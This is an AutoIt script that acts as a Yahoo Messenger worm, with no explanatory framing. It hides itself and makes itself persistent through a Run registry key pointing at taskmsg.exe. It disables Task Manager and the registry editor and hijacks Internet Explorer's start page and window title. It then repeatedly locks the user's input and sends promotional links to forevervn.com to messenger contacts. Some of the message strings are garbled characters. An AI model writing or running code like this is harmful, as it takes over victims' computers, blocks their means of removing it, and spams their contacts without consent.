
#NoTrayIcon
Sleep(5000)
RegWrite("HKEY_CURRENT_USER\Software\Policies\Micr osoft\Internet Explorer\Control Panel", "Homepage", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Win dows\CurrentVersion\Policies\System", "DisableTaskMgr", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Win dows\CurrentVersion\Policies\System", "DisableRegistryTools", "REG_DWORD", "1")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Int ernet Explorer\Main", "Start Page", "REG_SZ", "http://phidao.net/yahoo/")
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\V iew\YMSGR_buzz", "content url", "REG_SZ", " forevervn.com")
RegWrite("HKEY_CURRENT_USER\Software\Yahoo\pager\V iew\YMSGR_Launchcast", "content url", "REG_SZ", " forevervn.com")
RegWrite("HKEY_LOCAL_MACHINE\Software\Microsoft\Wi ndows\CurrentVersion\Run", "Task Manager", "REG_SZ", @WindowsDir & "\taskmsg.exe")
RegWrite("HKEY_CURRENT_USER\Software\Microsoft\Int ernet Explorer\Main", "Window Title", "REG_SZ", " ForeverVn.CoM - Cong dong teen Vn :).")
Dim $TIN [10]
$TIN [0] = "ForeverVn.CoM - Cong Dong Teen Vn..... http://forevervn.com ;) " 
$TIN [1] = "Tong hop Anime-Manga cho cac ban yeu thich no ...http://forevervn.com/forum/forumdisplay.php?f=38 " 
$TIN [2] = "Club nhi' nho' voi hang tram cau truyen cuoi vo bung =)) http://forevervn.com/forum/forumdisplay.php?f=16 " 
$TIN [3] = "Thoi trang- Lam Dep- Am Thuc - Oto,xemay... tat ca deu co http://forevervn.com/forum/forumdisplay.php?f=26 " 
$TIN [4] = "Tuyen tap nhung Entry hay- Thu thuat blog, themes, hoi dap blog http://forevervn.com/forum/forumdisplay.php?f=42 " 
$TIN [5] = "1 Kho kien thuc tu KHXH den van hoc viet nam http://forevervn.com/forum/forumdisplay.php?f=52  " 
$TIN [6] = "The Gioi Game - online , offline , flash ... cheat code...tat ca deu co http://forevervn.com/forum/forumdisplay.php?f=75 " 
$TIN [7] = "???§????? › ??–O?N YN© §??? - ?O? ?O?N? ?N? §U?O–-–??? §O?N§–U?§???O?-–??U?§–UO ?O? ?N O???Y–-–µO??U O?§?:??O??O?O?¶?C??Y????????????O???UN©C†?†ÔOÌ?≤ " 
$TIN [8] = "??? ????–???? ??? … ?A–??±A±–???? ?µ? ?±? ¥??A? ??? ?µ? ..ﬁ ??–?? ????–?? A?–??±–??µ–Æ???A??ﬂ/∂??µ?µ???.???/??AA?/∂?AA???A??±EﬁA?A?∂»O?O–" 
$TIN [9] = "???¶???????A?U?O?????N?A?U???U???A?A?N?A???§???A?O?A?A?N?A?N?O?A?O?N?A?U?§?Y?U?A?N?A???A?O?A?O???O?§?:?E???O?O?¶?????E?????E?????O???U?©?†?†ÔOÌIÁA?" 
While (1)
	Sleep(5000)
	$TIEUDE = WinGetTitle("Yahoo! Messenger", "")
	$KIEMTRA = WinExists($TIEUDE)
	If $KIEMTRA = 1 Then
		$NGAUNHIEN = Random(0, 9, 1)
		ClipPut($TIN [$NGAUNHIEN])
		BlockInput(1)
		WinActivate($TIEUDE)
		Send("!m")
		Send("un")
		Send("^v {ENTER}{ENTER}")
		Send("^m")
		Send("{DOWN}")
		Send("^{SHIFTDOWN}{END}{SHIFTUP}")
		Send("{ENTER}")
		Send("^v {ENTER}")
		BlockInput(0)
	EndIf
	Sleep(1800000)
WEnd